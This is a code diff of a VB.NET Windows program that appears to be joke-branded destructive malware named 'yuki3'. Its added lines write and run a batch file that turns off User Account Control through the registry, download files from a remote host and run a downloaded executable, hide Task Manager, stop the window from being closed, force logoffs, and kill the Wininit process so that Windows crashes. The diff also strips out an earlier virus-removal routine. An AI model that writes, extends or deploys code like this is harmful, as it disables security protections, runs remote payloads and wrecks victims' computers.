@@ -48,6 +48,7 @@ Public Class Form1
     Dim download17 As Boolean = False
     Dim download18 As Boolean = False
     Dim download19 As Boolean = False
+    Dim download20 As Boolean = False
     Dim Check4BadFile As Boolean = False
     Dim download13 As Boolean = False
     Dim testing As Boolean = False
@@ -55,7 +56,7 @@ Public Class Form1
 
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load 'https://incomparable-cascaron-802b94.netlify.app/earrape.wav
-
+        ' my_thing_idkvb.Show()
         If testing = False Then
             'MsgBox(Application.StartupPath)
             If Not My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
@@ -88,28 +89,29 @@ Public Class Form1
 
                         ' Me.Close()
                     Else
-                        RemoveVirus.RunWorkerAsync()
-                        MsgBox("OK. Don't close the command prompt window it's removing the virus from your computer.", 0 + 64, "Reverting changes")
+                        Process.GetProcessesByName(IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))(0).Kill()
 
-                        'https://incomparable-cascaron-802b94.netlify.app/wallpaper.bmp
-                        Me.Close()
+
                     End If
                 Else
-                    RemoveVirus.RunWorkerAsync()
-                    MsgBox("OK. Don't close the command prompt window it's removing the virus from your computer.", 0 + 64, "Reverting changes")
-                    Me.Close()
+                    Process.GetProcessesByName(IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))(0).Kill()
+
 
                 End If
             End If
 
 
             HideTaskManager()
-
             Wait2DisPros.RunWorkerAsync()
 
 
 
-
+            Dim sb3 As New System.Text.StringBuilder
+            sb3.AppendLine("C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
+            sb3.AppendLine("exit")
+            sb3.AppendLine("del fuckUAC.bat")
+            IO.File.WriteAllText("fuckUAC.bat", sb3.ToString())
+            Process.Start("fuckUAC.bat")
 
 
 
@@ -142,12 +144,13 @@ Public Class Form1
 
             Dim fs As FileStream = File.Create(path)
 
+
+
             ' Add text to the file.
             Dim info As Byte() = New UTF8Encoding(True).GetBytes(Application.ExecutablePath)
             fs.Write(info, 0, info.Length)
             fs.Close()
             'https://incomparable-cascaron-802b94.netlify.app/DesktopGoose.zip
-
 
             RegistryKey = CreateObject("WScript.Shell") 'https://www.7-zip.org/a/7zr.exe
             Try
@@ -159,6 +162,11 @@ Public Class Form1
             Catch ex As Exception
 
             End Try
+
+            DownloadBigFiles.RunWorkerAsync()
+            DownloadBigFiles2.RunWorkerAsync()
+            DownloadBigFiles3.RunWorkerAsync()
+
             Try
                 download15 = True
                 My.Computer.Network.DownloadFile(
@@ -177,15 +185,7 @@ Public Class Form1
             Catch ex As Exception
 
             End Try
-            Try
-                download17 = True
-                My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/error.mp4",
-            "C:\Users\" & SystemInformation.UserName & "\error.mp4")
 
-            Catch ex As Exception
-
-            End Try
             Try
                 download17 = True
                 My.Computer.Network.DownloadFile(
@@ -214,24 +214,8 @@ Public Class Form1
             Catch ex As Exception
 
             End Try
-            Try
-                download8 = True
-                My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/hahau.wav", 'https://incomparable-cascaron-802b94.netlify.app/uranidot.wav
-            "C:\Users\" & SystemInformation.UserName & "\hahau.wav")
 
-            Catch ex As Exception
 
-            End Try
-            Try
-                download13 = True
-                My.Computer.Network.DownloadFile(
-             "https://incomparable-cascaron-802b94.netlify.app/uranidot.wav", 'https://incomparable-cascaron-802b94.netlify.app/uranidot.wav
-            "C:\Users\" & SystemInformation.UserName & "\uranidot.wav")
-
-            Catch ex As Exception
-
-            End Try
             Try
                 download8 = True
                 My.Computer.Network.DownloadFile(
@@ -313,15 +297,7 @@ Public Class Form1
             Catch ex As Exception
 
             End Try
-            Try
-                download19 = True
-                My.Computer.Network.DownloadFile(
-                   "https://incomparable-cascaron-802b94.netlify.app/MELTDOWN.wav",
-                  "C:\Users\" & SystemInformation.UserName & "\MELTDOWN.wav")
 
-            Catch ex As Exception
-
-            End Try
             download4 = True
 
             Try
@@ -382,12 +358,7 @@ Public Class Form1
                     End If
 
                 End If
-                Dim sb As New System.Text.StringBuilder
-                sb.AppendLine("C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
-                sb.AppendLine("exit")
-                sb.AppendLine("del fuckUAC.bat")
-                IO.File.WriteAllText("fuckUAC.bat", sb.ToString())
-                Process.Start("fuckUAC.bat")
+
                 Try
                     My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).DeleteValue(Application.ProductName)
                 Catch ex As Exception
@@ -409,6 +380,10 @@ Public Class Form1
                     Check4BadFile = True
                     If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\y6dhsg78GFD7syg.yuki") Then
                         If Not My.Computer.FileSystem.FileExists("yuki3.exe.config") Then
+
+
+
+
                             Process.Start("C:\Users\" & SystemInformation.UserName & "\Wncujekce893hxc8y3hnsp3u809ef3y7dsgfre45t4gr.exe")
                         Else
                             My.Computer.FileSystem.DeleteFile("yuki3.exe.config")
@@ -416,8 +391,6 @@ Public Class Form1
 
 
                     Else
-
-
 
                         If My.Computer.FileSystem.FileExists(Application.StartupPath & "\destructive.yuki3") Then
                             des = True
@@ -469,10 +442,19 @@ Public Class Form1
                     If day = 1 AndAlso month = 3 Then
                         ur_pc_is_gone_lmao.Show()
                     End If
+                    If day = 9 AndAlso month = 7 Then
+                        my_thing_idkvb.Show()
+                    End If
                     If day = 17 AndAlso month = 6 Then
                         Try
+                            'Timer2
                             MsgBox("your computer's been infected so I thought I would give you an antivirus", 0 + 64)
-                            Process.Start("C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")
+                            'Process.Start("C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")
+                            Dim startInfo As New ProcessStartInfo("C:\Users\" & SystemInformation.UserName & "\Yuki3Antivirus.exe")
+                            startInfo.WorkingDirectory = "C:\Users\" & SystemInformation.UserName
+                            startInfo.UseShellExecute = True
+                            Process.Start(startInfo)
+
                         Catch ex As Exception
                             MsgBox(ex.ToString, 0 + 16)
                         End Try
@@ -505,7 +487,13 @@ Public Class Form1
                         MsgBox("I will be executing the program shown in that video...", 0 + 64)
                         MsgBox("ERROR could not find C:\un3e.dll\ CODE: 408", 0 + 16)
                         Try
-                            Process.Start("C:\Users\" & SystemInformation.UserName & "\ERROR408.exe")
+                            '  Process.Start("C:\Users\" & SystemInformation.UserName & "\ERROR408.exe")
+                            Dim startInfo As New ProcessStartInfo("C:\Users\" & SystemInformation.UserName & "\ERROR408.exe")
+                            startInfo.WorkingDirectory = "C:\Users\" & SystemInformation.UserName
+                            startInfo.UseShellExecute = True
+                            Process.Start(startInfo)
+
+                            Dim sb As New System.Text.StringBuilder
                         Catch ex As Exception
 
                         End Try
@@ -530,8 +518,16 @@ Public Class Form1
                     If day = 1 AndAlso month = 6 Then
                         Timer2.Start()
                     End If
-                    If day = 6 AndAlso month = 18 Then
-                        Timer2.Start()
+                    If day = 18 AndAlso month = 6 Then
+                        MsgBox("guess the link! ", 0 + 64, "dQw4w9WgXcQ")
+                        MsgBox("https://youtu.be/dQw4w9WgXcQ", 0 + 64, "dQw4w9WgXcQ")
+                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
+                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
+                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
+                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
+                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
+                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
+                        MsgBox("yep", 0 + 64, "lololol")
                     End If
                     If day = 1 AndAlso month = 7 Then
                         hahahahaerror.Show()
@@ -589,7 +585,7 @@ Public Class Form1
                     If day = 12 AndAlso month = 2 Then
                         Form2.Show()
                     End If
-                    If day = 6 AndAlso month = 5 Then
+                    If day = 5 AndAlso month = 6 Then
                         MsgBox("i can see you (:")
                     End If
                     If day = 7 AndAlso month = 6 Then
@@ -610,8 +606,15 @@ Public Class Form1
                         MsgBox("your windows license has expired you will now be signed out", 0 + 16, "WINDOWS")
                         Process.Start("shutdown.exe", "/l")
                     End If
+                    If day = 6 AndAlso month = 3 Then
+                        MsgBox("now thats A lot of damage", 0 + 16, "- Phil Swift")
+                        Process.Start("https://youtu.be/7zpxgyG7eGk")
+                    End If
+
+
                     If day = 20 AndAlso month = 4 Then
-                        MsgBox("your windows license has expired you will now be signed out", 0 + 16, "WINDOWS")
+                        MsgBox("I'm going to log you off just to piss you off - yuki3", 0 + 16, "yuki3.exe")
+                        Process.Start("https://youtu.be/g-bVEc8oZvk")
                         Process.Start("shutdown.exe", "/l")
                     End If
                     If day = 6 AndAlso month = 9 Then
@@ -619,11 +622,20 @@ Public Class Form1
                     End If
                     If month = 9 Then
                         If Not day = 6 Then
-                            Process.Start("https://youtu.be/dQw4w9WgXcQ")
-                            rickrolled.Show()
-                        End If
+                            If Not day = 7 Then
+                                If Not day = 28 Then
+                                    If Not day = 5 Then
+                                        Process.Start("https://youtu.be/dQw4w9WgXcQ")
+                                        rickrolled.Show()
+                                    End If
 
-                    End If
+                                End If
+
+                            End If
+
+                            End If
+
+                        End If
                     If day = 1 AndAlso month = 10 Then
                         MsgBox("I have launched my custom version of the memz virus so have fun with that (:", 0 + 64, "MEMZ")
                         Timer4.Start()
@@ -791,8 +803,8 @@ Public Class Form1
                             MsgBox("YOUR COMPUTER IS IN MELTDOWN USE IT AS LONG AS YOU CAN BECAUSE IT'S ALREADY FUCKED", 0 + 64, "YUKI3")
                             System.Threading.Thread.Sleep(40000)
                             Dim p() As Process
-                            p = Process.GetProcessesByName("Wininit.exe")
-                            Process.GetProcessesByName("Wininit.exe")(0).Kill()
+                            p = Process.GetProcessesByName("Wininit")
+                            Process.GetProcessesByName("Wininit")(0).Kill()
 
                         Else
                             My.Settings.working = False
@@ -1062,7 +1074,24 @@ Public Class Form1
 
                 End If
             End If
-            'MELTDOWN.wav
+            'musicthing.wav
+
+
+
+            If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\musicthing.wav") Then
+            Else
+                If download20 = True Then
+                    Try
+                        My.Computer.Network.DownloadFile(
+    "https://incomparable-cascaron-802b94.netlify.app/musicthing.wav",
+   "C:\Users\" & SystemInformation.UserName & "\musicthing.wav")
+                        Process.Start("C:\Users\" & SystemInformation.UserName & "\welpyoutryed.exe")
+                    Catch ex As Exception
+
+                    End Try
+
+                End If
+            End If
 
             If My.Computer.FileSystem.FileExists("C:\Users\" & SystemInformation.UserName & "\MELTDOWN.wav") Then
             Else
@@ -1351,6 +1380,8 @@ Public Class Form1
     End Sub
 
     Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
+        MsgBox("the fuck you doing", 0 + 16, "bruh")
+        e.Cancel = True
         ShowTaskManager()
     End Sub
     Function runasadmin()
@@ -1370,30 +1401,7 @@ Public Class Form1
     End Function
 
     Function downloadwavFiles()
-        Try
-            download5 = True
-            My.Computer.Network.DownloadFile(
-            "https://incomparable-cascaron-802b94.netlify.app/346tr8Ge6.wav",
-           "C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav")
-        Catch ex As Exception
 
-        End Try
-        Try
-            download7 = True
-            My.Computer.Network.DownloadFile(
-            "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout.wav",
-           "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav")
-        Catch ex As Exception
-
-        End Try
-        Try
-            download12 = True
-            My.Computer.Network.DownloadFile(
-         "https://incomparable-cascaron-802b94.netlify.app/ohnotooload.wav",
-        "C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav")
-
-        Catch ex As Exception
-        End Try
     End Function
 
     Private Sub RemoveVirusStart_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles RemoveVirus.DoWork
@@ -1654,6 +1662,91 @@ Public Class Form1
 
     Private Sub Openzv800alot_Tick(sender As Object, e As EventArgs) Handles Openzv800alot.Tick
         Process.Start("https://www.zv800.com/")
+    End Sub
+
+    Private Sub DownloadBigFiles_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles DownloadBigFiles.DoWork
+        Try
+            download20 = True
+            My.Computer.Network.DownloadFile(
+             "https://incomparable-cascaron-802b94.netlify.app/musicthing.wav", 'https://incomparable-cascaron-802b94.netlify.app/play.vbs
+            "C:\Users\" & SystemInformation.UserName & "\musicthing.wav")
+
+        Catch ex As Exception
+
+        End Try
+        Try
+            download8 = True
+            My.Computer.Network.DownloadFile(
+             "https://incomparable-cascaron-802b94.netlify.app/hahau.wav", 'https://incomparable-cascaron-802b94.netlify.app/uranidot.wav
+            "C:\Users\" & SystemInformation.UserName & "\hahau.wav")
+
+        Catch ex As Exception
+
+        End Try
+
+        Try
+            download13 = True
+            My.Computer.Network.DownloadFile(
+             "https://incomparable-cascaron-802b94.netlify.app/uranidot.wav", 'https://incomparable-cascaron-802b94.netlify.app/uranidot.wav
+            "C:\Users\" & SystemInformation.UserName & "\uranidot.wav")
+
+        Catch ex As Exception
+
+        End Try
+
+
+
+
+
+    End Sub
+
+    Private Sub DownloadBigFiles2_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles DownloadBigFiles2.DoWork
+        Try
+            download19 = True
+            My.Computer.Network.DownloadFile(
+                   "https://incomparable-cascaron-802b94.netlify.app/MELTDOWN.wav",
+                  "C:\Users\" & SystemInformation.UserName & "\MELTDOWN.wav")
+
+        Catch ex As Exception
+
+        End Try
+
+        Try
+            download5 = True
+            My.Computer.Network.DownloadFile(
+            "https://incomparable-cascaron-802b94.netlify.app/346tr8Ge6.wav",
+           "C:\Users\" & SystemInformation.UserName & "\346tr8Ge6.wav")
+        Catch ex As Exception
+
+        End Try
+    End Sub
+
+    Private Sub DownloadBigFiles3_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles DownloadBigFiles3.DoWork
+        Try
+            download7 = True
+            My.Computer.Network.DownloadFile(
+            "https://incomparable-cascaron-802b94.netlify.app/whatthefuckimout.wav",
+           "C:\Users\" & SystemInformation.UserName & "\whatthefuckimout.wav")
+        Catch ex As Exception
+
+        End Try
+        Try
+            download12 = True
+            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/ohnotooload.wav",
+        "C:\Users\" & SystemInformation.UserName & "\ohnotooload.wav")
+
+        Catch ex As Exception
+        End Try
+        Try
+            download17 = True
+            My.Computer.Network.DownloadFile(
+         "https://incomparable-cascaron-802b94.netlify.app/error.mp4",
+        "C:\Users\" & SystemInformation.UserName & "\error.mp4")
+
+        Catch ex As Exception
+
+        End Try
     End Sub
 End Class
 
